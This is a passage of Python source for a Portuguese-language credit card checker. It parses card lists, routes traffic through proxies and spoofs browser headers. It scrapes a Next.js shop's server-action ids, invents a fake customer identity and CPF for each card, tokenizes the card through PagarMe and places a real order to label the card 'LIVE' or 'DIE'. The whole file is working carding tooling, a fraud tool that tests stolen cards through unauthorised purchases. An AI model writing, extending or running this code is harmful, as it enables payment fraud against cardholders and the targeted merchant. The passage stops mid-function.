def banner_proxy():
    clear()
    banner()
    print(f"{BW_BOLD}  QUER USAR PROXY?{W}\n")
    print(f"{D}  ┌─────────────────────────────────┐{W}")
    print(f"{D}  │{W}  {BW_BOLD}[1]{W} {BW}SIM{W}  •  ip:port:user:pass    {D}│{W}")
    print(f"{D}  │{W}  {BW_BOLD}[2]{W} {BW}NÃO{W}  •  direto sem proxy    {D}│{W}")
    print(f"{D}  └─────────────────────────────────┘{W}\n")

def parse_proxy(s):
    s=s.strip()
    if not s:
        return None
    parts=s.split(":")
    if len(parts)==4:
        ip,port,user,pw=[p.strip() for p in parts]
        if not ip or not port.isdigit() or not user:
            return None
        url=f"http://{user}:{pw}@{ip}:{port}"
        return {"http":url, "https":url}
    return None

def proxy_menu():
    global PROXY_DICT
    banner_proxy()
    while True:
        try:
            op=input(f"  {BW}▸{W} Escolha {B}[1/2]{W}: ").strip()
        except EOFError:
            op="2"
        if op in ("1","2"):
            break
        print(f"  {R}  Opção inválida. Digite 1 ou 2.{W}")
    if op=="1":
        print(f"\n  {D} Formato: {BW_BOLD}ip:port:user:pass{W}")
        print(f"  {D} Exemplo: 192.168.1.10:8080:usuario:senha{W}\n")
        while True:
            try:
                raw=input(f"  {BW}▸{W} Cole a proxy: ").strip()
            except EOFError:
                raw=""
            if not raw:
                print(f"  {R}  Proxy vazia.{W}")
                continue
            proxy=parse_proxy(raw)
            if proxy:
                PROXY_DICT=proxy
                masked=raw.split(":")[0]+":"+raw.split(":")[1]+":***:***"
                print(f"\n  {G}  ✔ Proxy adicionada: {masked} {W}")
                time.sleep(0.8)
                break
            else:
                print(f"  {R}  Formato inválido. Use ip:port:user:pass{W}")
    else:
        PROXY_DICT=None
        print(f"\n  {D}  → Sem proxy, conexão direta.{W}")
        time.sleep(0.6)
    clear()
    banner()

# ---------- utils debug ----------
def dbg(msg):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    if DEBUG:
        print(f"{D}{line}{W}")
    try:
        with open(DEBUG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except:
        pass

def parse_card(line):
    line = line.strip()
    parts = [p.strip() for p in line.split("|")]
    if len(parts) != 4:
        return None
    num, mes, ano, cvc = parts
    num = re.sub(r"\D", "", num)
    mes = mes.zfill(2)[-2:]
    cvc = re.sub(r"\D", "", cvc)
    ano = re.sub(r"\D", "", ano)
    if len(ano) == 2:
        # 00-79 -> 2000-2079, 80-99 -> 1980-1999
        yi = int(ano)
        ano = f"20{ano}" if yi < 80 else f"19{ano}"
    elif len(ano) != 4:
        return None
    if not (13 <= len(num) <= 19):
        return None
    if not mes.isdigit() or not ano.isdigit() or not cvc.isdigit():
        return None
    try:
        if not 1 <= int(mes) <= 12:
            return None
        if not 2024 <= int(ano) <= 2100:
            # permite mas avisa
            pass
    except:
        return None
    if not (3 <= len(cvc) <= 4):
        return None
    formatted = f"{num}|{mes}|{ano}|{cvc}"
    return formatted, (num, mes, ano, cvc)

def make_session():
    s = requests.Session()
    if PROXY_DICT:
        s.proxies.update(PROXY_DICT)
        s.trust_env=False
    s.headers.update({
        "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Sec-Ch-Ua": '"Not=A?Brand";v="99", "Brave";v="151", "Chromium";v="151"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Gpc": "1",
        "Connection": "keep-alive",
    })
    return s

def extract_deployment_id(resp):
    # tenta headers
    for k in ["x-nextjs-deployment-id", "x-deployment-id", "x-vercel-id"]:
        v = resp.headers.get(k) or resp.headers.get(k.lower())
        if v and v.startswith("dpl_"):
            return v
    # fallback procura no body
    m = re.search(r'dpl_[A-Za-z0-9_]+', resp.text)
    if m:
        return m.group(0)
    return DEFAULT_DEPLOYMENT

def extract_router_state(html):
    # procura next-router-state-tree encoded
    m = re.search(r'next-router-state-tree["\']\s*:\s*["\']([^"\']+)["\']', html)
    if m:
        return m.group(1)
    # fallback: procura padrão %5B%22%22%2C%7B%22children%22
    m = re.search(r'(%5B%22%22.*4112%5D)', html)
    if m:
        return m.group(1)
    return DEFAULT_ROUTER_STATE

def extract_action_ids_from_text(text):
    """
    Extrai hashes 40hex associados a cada server action.
    Padrão dump: (0,m.createServerReference)("HASH",...,"criarPedido")
    """
    found = {}
    # mapeia nome -> regex
    mapping = {
        "criarPedido": r'"([a-f0-9]{40})".*?criarPedido',
        "iniciarPagamento": r'"([a-f0-9]{40})".*?iniciarPagamento',
        "pagamentoDisponivel": r'"([a-f0-9]{40})".*?pagamentoDisponivel',
        "cotarFrete": r'"([a-f0-9]{40})".*?cotarFrete',
        # alternativo: cotarFrete pode estar como função sem nome direto, tenta por peso
    }
    for name, pat in mapping.items():
        m = re.search(pat, text, re.S)
        if m:
            found[name] = m.group(1)
            dbg(f"[EXTRACT] action {name} = {m.group(1)}")
        else:
            dbg(f"[EXTRACT] action {name} NÃO encontrado em texto len={len(text)}")
    # fallback genérico: pega todos 40hex e tenta associar por proximidade de string
    if len(found) < 4:
        all_hex = re.findall(r'"([a-f0-9]{40})"', text)
        dbg(f"[EXTRACT] total hex encontrados {len(all_hex)}")
        # se ainda faltar, tenta buscar em outro chunk
    return found

def parse_rsc_text(text):
    """
    RSC response formato:
    0:{"a":"$@1",...}
    1:{"ok":true,...}
    Pode ter várias linhas. Retorna dict da linha 1 ou último JSON válido.
    """
    # tenta linha por linha
    for line in text.splitlines():
        line=line.strip()
        if line.startswith("1:"):
            try:
                return json.loads(line[2:])
            except:
                # tenta tirar prefixo e decode
                try:
                    return json.loads(line.split(":",1)[1])
                except:
                    continue
    # fallback: procura JSON com ok / disponivel / opcoes
    m = re.search(r'\{"ok".*?\}', text)
    if m:
        try:
            return json.loads(m.group(0))
        except: pass
    m = re.search(r'\{"disponivel".*?\}', text)
    if m:
        try:
            return json.loads(m.group(0))
        except: pass
    m = re.search(r'\{"opcoes".*?\}\]', text, re.S)
    if m:
        # tenta achar opcoes
        try:
            # extrai objeto
            inner = re.search(r'\{"opcoes":.*?\}\]\}', text, re.S)
            if inner:
                # não trivial, tenta loads da linha 1 novamente
                pass
        except: pass
    return None

def extract_error_from_rsc(text):
    """Tenta extrair mensagem de erro de RSC ou JSON."""
    # procura {"erro":...} ou {"mensagem":...} ou {"message":...}
    for key in ["erro", "mensagem", "message", "error", "msg"]:
        m = re.search(rf'"{key}"\s*:\s*"([^"]+)"', text)
        if m:
            return m.group(1)
    # procura texto entre aspas após ok:false
    m = re.search(r'"ok"\s*:\s*false[^}]+"([^"]+)"', text)
    if m:
        return m.group(1)
    # fallback: primeiros 300 chars sem RSC markers
    clean = re.sub(r'^\d+:', '', text, flags=re.M)
    clean = re.sub(r'\s+', ' ', clean).strip()
    return clean[:300] if clean else "Erro desconhecido"

def _normalize_txt(s):
    """Normaliza texto: corrige mojibake (Ã£), lower, remove acentos para comparar."""
    if not s:
        return ""
    # tenta corrigir duplo-encode tipo nÃ£o -> não
    try:
        if "Ã" in s or "Â" in s:
            s = s.encode("latin1").decode("utf-8")
    except:
        pass
    s = s.lower()
    # remove acentos
    import unicodedata
    s = "".join(c for c in unicodedata.normalize("NFD", s) if unicodedata.category(c) != "Mn")
    return s

def _sanitize_msg(msg):
    """Se msg contém 'aprovad' + 'sucesso' retorna só 'Transacao aprovada com sucesso'."""
    if not msg:
        return msg
    n = _normalize_txt(msg)
    if "aprovad" in n and "sucesso" in n:
        return "Transacao aprovada com sucesso"
    return msg

def is_live_response(status_text, pedido_html=""):
    """
    Detecta LIVE por múltiplas assinaturas:
    - status == pago
    - texto contém pagamento aprovado / confirmado / pedido realizado / pedido confirmado
    - html do pedido contém Pago / Pagamento confirmado / Pedido confirmado
    - PRIORIDADE: 'aprovad' + 'sucesso' sempre LIVE mesmo se vier com 'nao autorizado'
    """
    t_raw = status_text or ""
    t = _normalize_txt(t_raw)
    live_kw = ["pago", "pagamento aprovado", "pagamento confirmado", "pedido confirmado", "pedido realizado", "aprovad", "confirmado", "aprovada com sucesso", "transacao aprovada"]
    die_kw = ["recus", "declined", "negado", "falhou", "erro", "insuficiente", "expired", "aguardando_pagamento"]
    # REGRA PRIORITÁRIA: se contém 'aprovad' + 'sucesso' é LIVE mesmo com 'nao autorizado'
    if "aprovad" in t and "sucesso" in t:
        return True
    if "transacao aprovada" in t:
        return True
    # se contém live e não é só aguardando
    if any(k in t for k in live_kw):
        # mas se for aguardando_pagamento + recusa, não é live (exceto já tratado acima)
        if "aguardando_pagamento" in t and any(k in t for k in ["recus", "negad", "falh"]):
            # se for aprovada mesmo aguardando, já retornou True acima
            return False
        if "aguardando_pagamento" in t and "pago" not in t:
            # não considera live se só aguardando
            return False
        return True
    # checa html pedido (normalizado)
    if pedido_html:
        h = _normalize_txt(pedido_html)
        if "pago" in h and "pedido" in h:
            return True
        if "pagamento confirmado" in h:
            return True
        if "pedido confirmado" in h:
            return True
        if "preparando seu pedido" in h:  # texto da dump quando pago
            return True
    return False

def process_card(card_fmt, idx, total):
    t0 = time.time()
    def tempo():
        return f"{time.time()-t0:.1f}s"
    parsed = parse_card(card_fmt)
    if not parsed:
        return "DIE", card_fmt, "Formato inválido. Use numero|mes|ano|cvc", tempo()
    _, (num, mes, ano, cvc) = parsed
    dbg(f"\n{'='*70}")
    dbg(f"[{idx}/{total}] INICIO CARD {card_fmt} num={num[:6]}****{num[-4:]} mes={mes} ano={ano} cvc={cvc}")

    s = make_session()
    deployment_id = DEFAULT_DEPLOYMENT
    router_state = DEFAULT_ROUTER_STATE
    actions = dict(DEFAULT_ACTIONS)

    # 1) GET checkout para aquecer sessão + extrair deployment + routerState + actions
    dbg(f"[{idx}] GET {CHECKOUT_URL}")
    try:
        r = s.get(CHECKOUT_URL, timeout=20, allow_redirects=True)
    except Exception as e:
        dbg(f"[{idx}] GET checkout EXCEPTION {e}")
        return "DIE", card_fmt, f"GET checkout exception: {e}", tempo()
    dbg(f"[{idx}] GET checkout status={r.status_code} len={len(r.text)} cookies={dict(s.cookies)} headers={dict(r.headers)}")
    deployment_id = extract_deployment_id(r) or deployment_id
    dbg(f"[{idx}] TOKENS deployment_id={deployment_id} cookies={dict(s.cookies)}")

    # tenta extrair pk e actions do HTML inicial
    html = r.text
    # procura pk
    m_pk = re.search(r'pk_[A-Za-z0-9]+', html)
    if m_pk:
        dbg(f"[{idx}] PK encontrado no HTML {m_pk.group(0)}")
    # tenta extrair routerState do HTML
    rs = extract_router_state(html)
    if rs != DEFAULT_ROUTER_STATE:
        router_state = rs
        dbg(f"[{idx}] router_state extraído {router_state[:80]}...")
    # extrai actions do HTML se tiver inline JS com hashes
    found = extract_action_ids_from_text(html)
    for k,v in found.items():
        actions[k]=v

    # Se ainda faltam actions, baixa chunks JS listados no HTML
    if len([k for k in DEFAULT_ACTIONS if k not in found]) > 0:
        # pega todos scripts src
        script_urls = re.findall(r'src="(/_next/static/[^"]+\.js)"', html)
        dbg(f"[{idx}] scripts encontrados {len(script_urls)}")
        for src in script_urls[:8]:  # limita para não floodar
            js_url = BASE + src
            try:
                rjs = s.get(js_url, timeout=15)
                dbg(f"[{idx}] GET chunk {src} status={rjs.status_code} len={len(rjs.text)}")
                f2 = extract_action_ids_from_text(rjs.text)
                for k,v in f2.items():
                    if k not in actions or actions[k]==DEFAULT_ACTIONS[k]:
                        actions[k]=v
                # também procura pk
                m_pk2 = re.search(r'pk_[A-Za-z0-9]+', rjs.text)
                if m_pk2:
                    dbg(f"[{idx}] PK no chunk {src} = {m_pk2.group(0)}")
            except Exception as e:
                dbg(f"[{idx}] GET chunk {src} fail {e}")
                continue
        # Se ainda faltam, tenta chunk específico da dump (145bip...)
        if "criarPedido" not in actions or actions["criarPedido"]==DEFAULT_ACTIONS["criarPedido"]:
            # tenta forçar busca em HTML completo via RSC page
            try:
                r_rsc = s.get(CHECKOUT_RSC_PAGE, headers={"rsc":"1", "next-router-state-tree": router_state, "x-deployment-id": deployment_id, "accept":"text/x-component"}, timeout=15)
                dbg(f"[{idx}] RSC PAGE status={r_rsc.status_code} len={len(r_rsc.text)}")
            except: pass

    dbg(f"[{idx}] FINAL actions={actions} deployment={deployment_id} router={router_state[:60]}...")

    # valida actions
    for k in ["pagamentoDisponivel","criarPedido","iniciarPagamento"]:
        if k not in actions:
            dbg(f"[{idx}] ERRO action {k} não extraído, usando fallback {DEFAULT_ACTIONS[k]}")
            actions[k]=DEFAULT_ACTIONS[k]
    if "cotarFrete" not in actions:
        actions["cotarFrete"]=DEFAULT_ACTIONS["cotarFrete"]

    # Headers base para Server Actions
    base_headers = {
        "User-Agent": UA,
        "Accept": "text/x-component",
        "Accept-Language": "pt-BR,pt;q=0.6",
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": BASE,
        "Referer": CHECKOUT_URL,
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Sec-Gpc": "1",
        "Priority": "u=1, i",
        "Next-Action": "",  # será preenchido por request
        "X-Deployment-Id": deployment_id,
        "Next-Router-State-Tree": router_state,
    }

    # 2) pagamentoDisponivel
    dbg(f"[{idx}] POST pagamentoDisponivel action={actions['pagamentoDisponivel']}")
    try:
        h = dict(base_headers)
        h["Next-Action"] = actions["pagamentoDisponivel"]
        h["X-Deployment-Id"] = deployment_id
        h["Next-Router-State-Tree"] = router_state
        # headers lower case requeridos pela dump: next-action, x-deployment-id, next-router-state-tree
        # requests vai normalizar, mas Vercel aceita case-insensitive. Enviamos ambos.
        h2 = {
            "content-type": "text/plain;charset=UTF-8",
            "next-action": actions["pagamentoDisponivel"],
            "next-router-state-tree": router_state,
            "x-deployment-id": deployment_id,
            "origin": BASE,
            "referer": CHECKOUT_URL,
            "accept": "text/x-component",
            "user-agent": UA,
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "pt-BR,pt;q=0.6",
            "priority": "u=1, i",
            "sec-ch-ua": '"Not=A?Brand";v="99", "Brave";v="151", "Chromium";v="151"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-gpc": "1",
        }
        r_disp = s.post(CHECKOUT_URL, headers=h2, data="[]", timeout=20)
    except Exception as e:
        dbg(f"[{idx}] pagamentoDisponivel EXCEPTION {e}")
        return "DIE", card_fmt, f"pagamentoDisponivel exception: {e}", tempo()
    dbg(f"[{idx}] pagamentoDisponivel status={r_disp.status_code} body={r_disp.text[:2000]} headers={dict(r_disp.headers)}")
    if r_disp.status_code != 200:
        return "DIE", card_fmt, f"pagamentoDisponivel HTTP {r_disp.status_code}: {r_disp.text[:300]}", tempo()
    j_disp = parse_rsc_text(r_disp.text)
    dbg(f"[{idx}] pagamentoDisponivel parsed={j_disp}")
    if j_disp and j_disp.get("disponivel") is False:
        msg = j_disp.get("mensagem") or "Pagamento indisponível"
        return "DIE", card_fmt, msg, tempo()
    # se não tem disponivel true, mas não é false, segue
    # atualiza deployment se mudou
    dep2 = r_disp.headers.get("x-nextjs-deployment-id") or r_disp.headers.get("x-deployment-id")
    if dep2 and dep2.startswith("dpl_"):
        deployment_id = dep2
        dbg(f"[{idx}] deployment atualizado para {deployment_id}")

    # gera dados aleatórios POR CARD (identidade + produto diferente <50)
    cliente_rand, endereco_rand, holder_name_rand, holder_doc_rand, tel_digits_rand = gerar_dados_cliente()
    produto_id_rand, produto_nome_rand, produto_preco_rand, produto_preco_str_rand = _gerar_produto_valido()
    dbg(f"[{idx}] DADOS RANDOM nome={cliente_rand['nome']} cpf={cliente_rand['cpf']} email={cliente_rand['email']} tel={cliente_rand['telefone']} numero={endereco_rand['numero']} holder={holder_name_rand} doc={holder_doc_rand}")
    dbg(f"[{idx}] PRODUTO RANDOM id={produto_id_rand} nome={produto_nome_rand} preco={produto_preco_str_rand}")

    # 3) cotarFrete (opcional mas recomendado; se falhar, continua com Sedex)
    frete_nome = FRETE_NOME
    frete_valor = 10.36
    try:
        dbg(f"[{idx}] POST cotarFrete action={actions['cotarFrete']} cep={endereco_rand['cep']} peso=300")
        h3 = {
            "content-type": "text/plain;charset=UTF-8",
            "next-action": actions["cotarFrete"],
            "next-router-state-tree": router_state,
            "x-deployment-id": deployment_id,
            "origin": BASE,
            "referer": CHECKOUT_URL,
            "accept": "text/x-component",
            "user-agent": UA,
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "pt-BR,pt;q=0.6",
            "priority": "u=1, i",
            "sec-ch-ua": '"Not=A?Brand";v="99", "Brave";v="151", "Chromium";v="151"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
        }
        body_frete = json.dumps([endereco_rand["cep"], 300], ensure_ascii=False)
        r_frete = s.post(CHECKOUT_URL, headers=h3, data=body_frete, timeout=20)
        dbg(f"[{idx}] cotarFrete status={r_frete.status_code} body={r_frete.text[:2000]}")
        if r_frete.status_code == 200:
            j_frete = parse_rsc_text(r_frete.text)
            dbg(f"[{idx}] cotarFrete parsed={j_frete}")
            if j_frete and "opcoes" in j_frete:
                # escolhe Sedex se existir, senão primeiro
                op = next((o for o in j_frete["opcoes"] if o.get("nome")==FRETE_NOME), j_frete["opcoes"][0] if j_frete["opcoes"] else None)
                if op:
                    frete_nome = op.get("nome", FRETE_NOME)
                    frete_valor = op.get("valor", frete_valor)
                    dbg(f"[{idx}] frete escolhido {frete_nome} R${frete_valor}")
            dep3 = r_frete.headers.get("x-nextjs-deployment-id") or r_frete.headers.get("x-deployment-id")
            if dep3 and dep3.startswith("dpl_"):
                deployment_id = dep3
        else:
            dbg(f"[{idx}] cotarFrete falhou HTTP {r_frete.status_code}, usando fallback {frete_nome}")
    except Exception as e:
        dbg(f"[{idx}] cotarFrete EXCEPTION {e} -> fallback")
        pass

    # 3b) viacep opcional (só debug)
    try:
        r_via = s.get(VIACEP_URL, timeout=10)
        dbg(f"[{idx}] viacep status={r_via.status_code} body={r_via.text[:300]}")
    except: pass

    # 4) PagarMe token (usa holder_name/document randomizados por card)
    dbg(f"[{idx}] POST PagarMe token card={num[:6]}****{num[-4:]} exp={mes}/{ano} cvc={cvc} holder={holder_name_rand} doc={holder_doc_rand}")
    pagarme_payload = {
        "type": "card",
        "card": {
            "number": num,
            "holder_name": holder_name_rand,
            "holder_document": holder_doc_rand,
            "exp_month": int(mes),
            "exp_year": int(ano),
            "cvv": cvc
        }
    }
    pagarme_headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": BASE,
        "Referer": BASE + "/",
        "User-Agent": UA,
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "pt-BR,pt;q=0.6",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Connection": "keep-alive",
    }
    try:
        r_token = s.post(PAGARME_TOKEN_URL, headers=pagarme_headers, json=pagarme_payload, timeout=20)
    except Exception as e:
        dbg(f"[{idx}] PagarMe EXCEPTION {e}")
        return "DIE", card_fmt, f"PagarMe exception: {e}", tempo()
    dbg(f"[{idx}] PagarMe status={r_token.status_code} headers={dict(r_token.headers)} body={r_token.text[:2000]} cookies={dict(s.cookies)}")
    # extrai tokens ids
    pagarme_token = None
    pagarme_brand = ""
    last4 = ""
    if r_token.status_code != 200:
        # tenta extrair erro pagarme
        try:
            j_err = r_token.json()
            msg_err = j_err.get("message") or j_err.get("error") or j_err.get("errors") or r_token.text[:300]
            if isinstance(msg_err, list):
                msg_err = "; ".join(str(x) for x in msg_err)
            elif isinstance(msg_err, dict):
                msg_err = json.dumps(msg_err, ensure_ascii=False)
        except:
            msg_err = r_token.text[:400]
        dbg(f"[{idx}] PagarMe erro {msg_err}")
        # normaliza para padrão Die
        clean = re.sub(r'\s+', ' ', str(msg_err)).strip()[:300]
        return "DIE", card_fmt, clean or f"PagarMe HTTP {r_token.status_code}", tempo()
    try:
        j_token = r_token.json()
        pagarme_token = j_token.get("id")
        pagarme_brand = j_token.get("card", {}).get("brand", "") if isinstance(j_token.get("card"), dict) else ""
        last4 = j_token.get("card", {}).get("last_four_digits", "") if isinstance(j_token.get("card"), dict) else ""
        dbg(f"[{idx}] PagarMe token={pagarme_token} brand={pagarme_brand} last4={last4} full={j_token}")
    except Exception as e:
        dbg(f"[{idx}] PagarMe json parse fail {e} body={r_token.text[:500]}")
        return "DIE", card_fmt, f"PagarMe resposta inválida: {r_token.text[:300]}", tempo()
    if not pagarme_token:
        return "DIE", card_fmt, f"PagarMe sem token: {r_token.text[:400]}", tempo()
    dbg(f"[{idx}] PagarMe TOKENS id={pagarme_token} brand={pagarme_brand} last4={last4}")

    # 5) criarPedido (usa cliente/endereco randomizados por card)
    dbg(f"[{idx}] POST criarPedido action={actions['criarPedido']} token={pagarme_token[:12]}... cliente={cliente_rand['nome']} numero={endereco_rand['numero']}")
    criar_body_obj = {
        "cliente": cliente_rand,
        "endereco": endereco_rand,
        "itens": [{"produtoId": produto_id_rand, "qtd": 1}],
        "cupom": "$undefined",
        "freteNome": frete_nome,
        "sacolaPresente": False,
        "mensagemCartao": "$undefined",
        "formaPagamento": "cartao",
        "brindeEscolhidoId": "$undefined",
        "idTokenCliente": "$undefined"
    }
    # o dump envia complemento como "$undefined" quando vazio
    if not criar_body_obj["endereco"].get("complemento"):
        criar_body_obj["endereco"]["complemento"] = "$undefined"
    body_criar = json.dumps([criar_body_obj], ensure_ascii=False)

    h4 = {
        "content-type": "text/plain;charset=UTF-8",
        "next-action": actions["criarPedido"],
        "next-router-state-tree": router_state,
        "x-deployment-id": deployment_id,
        "origin": BASE,
        "referer": CHECKOUT_URL,
        "accept": "text/x-component",
        "user-agent": UA,
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "pt-BR,pt;q=0.6",
        "priority": "u=1, i",
        "sec-ch-ua": '"Not=A?Brand";v="99", "Brave";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-gpc": "1",
    }
    try:
        r_criar = s.post(CHECKOUT_URL, headers=h4, data=body_criar.encode("utf-8"), timeout=25)
    except Exception as e:
        dbg(f"[{idx}] criarPedido EXCEPTION {e}")
        return "DIE", card_fmt, f"criarPedido exception: {e}", tempo()
    dbg(f"[{idx}] criarPedido status={r_criar.status_code} headers={dict(r_criar.headers)} body={r_criar.text[:3000]} cookies={dict(s.cookies)}")
    if r_criar.status_code != 200:
        return "DIE", card_fmt, f"criarPedido HTTP {r_criar.status_code}: {r_criar.text[:400]}", tempo()
    j_criar = parse_rsc_text(r_criar.text)
    dbg(f"[{idx}] criarPedido parsed={j_criar}")
    # tenta extrair erro detalhado se ok != true
    if not j_criar:
        # tenta regex
        err_raw = extract_error_from_rsc(r_criar.text)
        dbg(f"[{idx}] criarPedido sem parse erro={err_raw}")
        return "DIE", card_fmt, err_raw[:300], tempo()
    if j_criar.get("ok") is not True:
        # pode ter erro, mensagem, ou campo erro
        msg = j_criar.get("erro") or j_criar.get("mensagem") or j_criar.get("message") or j_criar.get("error") or extract_error_from_rsc(r_criar.text)
        dbg(f"[{idx}] criarPedido ok false msg={msg}")
        clean = re.sub(r'\s+', ' ', str(msg)).strip()[:400]
        return "DIE", card_fmt, clean or "Falha ao criar pedido", tempo()
    numero = j_criar.get("numero")
    token_acesso = j_criar.get("token")
    dbg(f"[{idx}] criarPedido TOKENS numero={numero} tokenAcesso={token_acesso} cookies={dict(s.cookies)}")
    if not numero or not token_acesso:
        return "DIE", card_fmt, f"criarPedido sem numero/token: {j_criar}", tempo()
    dep4 = r_criar.headers.get("x-nextjs-deployment-id") or r_criar.headers.get("x-deployment-id")
    if dep4 and dep4.startswith("dpl_"):
        deployment_id = dep4

    # 6) iniciarPagamento
    dbg(f"[{idx}] POST iniciarPagamento action={actions['iniciarPagamento']} numero={numero} tokenAcesso={token_acesso[:10]}... cardToken={pagarme_token[:10]}...")
    iniciar_body = json.dumps([{"numero": str(numero), "tokenAcesso": token_acesso, "cartao": {"token": pagarme_token, "parcelas": 1}}], ensure_ascii=False)
    h5 = {
        "content-type": "text/plain;charset=UTF-8",
        "next-action": actions["iniciarPagamento"],
        "next-router-state-tree": router_state,
        "x-deployment-id": deployment_id,
        "origin": BASE,
        "referer": CHECKOUT_URL,
        "accept": "text/x-component",
        "user-agent": UA,
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "pt-BR,pt;q=0.6",
        "priority": "u=1, i",
        "sec-ch-ua": '"Not=A?Brand";v="99", "Brave";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-gpc": "1",
    }
    try:
        r_pag = s.post(CHECKOUT_URL, headers=h5, data=iniciar_body.encode("utf-8"), timeout=25)
    except Exception as e:
        dbg(f"[{idx}] iniciarPagamento EXCEPTION {e}")
        return "DIE", card_fmt, f"iniciarPagamento exception: {e}", tempo()
    dbg(f"[{idx}] iniciarPagamento status={r_pag.status_code} headers={dict(r_pag.headers)} body={r_pag.text[:4000]} cookies={dict(s.cookies)}")
    if r_pag.status_code != 200:
        return "DIE", card_fmt, f"iniciarPagamento HTTP {r_pag.status_code}: {r_pag.text[:400]}", tempo()
    j_pag = parse_rsc_text(r_pag.text)
    dbg(f"[{idx}] iniciarPagamento parsed={j_pag} raw={r_pag.text[:2000]}")
    if not j_pag:
        err_raw = extract_error_from_rsc(r_pag.text)
        dbg(f"[{idx}] iniciarPagamento sem parse err={err_raw}")
        # pode ser redirect para pedido? verifica se texto contém pedido
        if "pedido" in r_pag.text.lower() or "pago" in r_pag.text.lower():
            # considera LIVE
            dbg(f"[{idx}] iniciarPagamento sem parse mas contém pedido/pago => LIVE")
            return "LIVE", card_fmt, "Pagamento confirmado - redirecionado para pedido", tempo()
        return "DIE", card_fmt, err_raw[:400], tempo()
    # j_pag pode ter ok, status, erro
    if j_pag.get("ok") is True:
        status = j_pag.get("status", "")
        dbg(f"[{idx}] iniciarPagamento ok true status={status}")
        # LIVE conditions
        if status == "pago":
            # faz GET pedido para confirmar LIVE e pegar prova
            try:
                pedido_url = f"{BASE}/pedido/{numero}?t={token_acesso}&_rsc=zihQuU1BN0PSo3n-"
                h_ped = {
                    "rsc": "1",
                    "next-router-state-tree": router_state,
                    "next-url": "/checkout",
                    "x-deployment-id": deployment_id,
                    "accept": "*/*",
                    "user-agent": UA,
                    "referer": CHECKOUT_URL,
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                }
                r_ped = s.get(pedido_url, headers=h_ped, timeout=15)
                dbg(f"[{idx}] GET pedido status={r_ped.status_code} body_snip={r_ped.text[:2000]}")
                # verifica se pedido realmente está pago
                if "pago" in r_ped.text.lower() or "pagamento confirmado" in r_ped.text.lower() or "pedido confirmado" in r_ped.text.lower():
                    return "LIVE", card_fmt, f"Pagamento aprovado - pedido {numero} pago", tempo()
            except Exception as e:
                dbg(f"[{idx}] GET pedido fail {e}")
            return "LIVE", card_fmt, f"Pagamento aprovado - pedido {numero} status pago", tempo()
        elif status == "aguardando_pagamento":
            # verifica se tem recusa
            recusa = j_pag.get("mensagem") or j_pag.get("erro") or j_pag.get("ultimaRecusa") or j_pag.get("error") or ""
            # também pode vir em payment.ultimaRecusa
            if isinstance(j_pag.get("pagamento"), dict):
                recusa = j_pag["pagamento"].get("ultimaRecusa") or recusa
            if recusa:
                clean = re.sub(r'\s+', ' ', str(recusa)).strip()[:400]
                dbg(f"[{idx}] aguardando_pagamento com recusa {clean}")
                # PRIORIDADE: se recusa contém 'aprovad' + 'sucesso' trata como LIVE (só 'Transacao aprovada com sucesso')
                if is_live_response(clean, ""):
                    return "LIVE", card_fmt, _sanitize_msg(clean) or "Transacao aprovada com sucesso", tempo()
                return "DIE", card_fmt, _sanitize_msg(clean) or "Pagamento recusado", tempo()
            # sem recusa mas ainda aguardando -> considera DIE (não aprovado)
            # tenta GET pedido para ver se mudou
            try:
                pedido_url = f"{BASE}/pedido/{numero}?t={token_acesso}&_rsc=zihQuU1BN0PSo3n-"
                r_ped2 = s.get(pedido_url, headers={"rsc":"1","x-deployment-id":deployment_id,"user-agent":UA}, timeout=15)
                dbg(f"[{idx}] GET pedido aguardando status={r_ped2.status_code} body={r_ped2.text[:1500]}")
                if "pago" in r_ped2.text.lower():
                    return "LIVE", card_fmt, f"Pagamento aprovado - pedido {numero} pago (poll)", tempo()
            except: pass
            return "DIE", card_fmt, recusa or "Pagamento recusado - aguardando_pagamento", tempo()
        else:
            # outros status: pago, em_producao etc são LIVE
            if is_live_response(status, r_pag.text):
                return "LIVE", card_fmt, f"Pagamento aprovado - status {status}", tempo()
            # se status vazio mas ok true e tem numero, considera LIVE (passou de tela)
            if numero:
                # verifica se redirecionou: qualquer ok true sem erro é LIVE por "passou a tela"
                dbg(f"[{idx}] iniciarPagamento ok true mas status={status} => considera LIVE (passou tela)")
                return "LIVE", card_fmt, f"Pedido realizado - {status or 'ok'}", tempo()
            return "DIE", card_fmt, f"Status não pago: {status or j_pag}", tempo()
    else:
        # ok false ou sem ok
        msg = j_pag.get("erro") or j_pag.get("mensagem") or j_pag.get("message") or j_pag.get("error") or extract_error_from_rsc(r_pag.text)
        # tenta extrair ultimaRecusa
        if isinstance(j_pag.get("pagamento"), dict) and j_pag["pagamento"].get("ultimaRecusa"):
            msg = j_pag["pagamento"]["ultimaRecusa"]
        clean = re.sub(r'\s+', ' ', str(msg)).strip()[:500]
        clean = _sanitize_msg(clean)
        # Detecta se mesmo com ok false houve redirect/pedido (live por tela)
        if is_live_response(clean, r_pag.text):
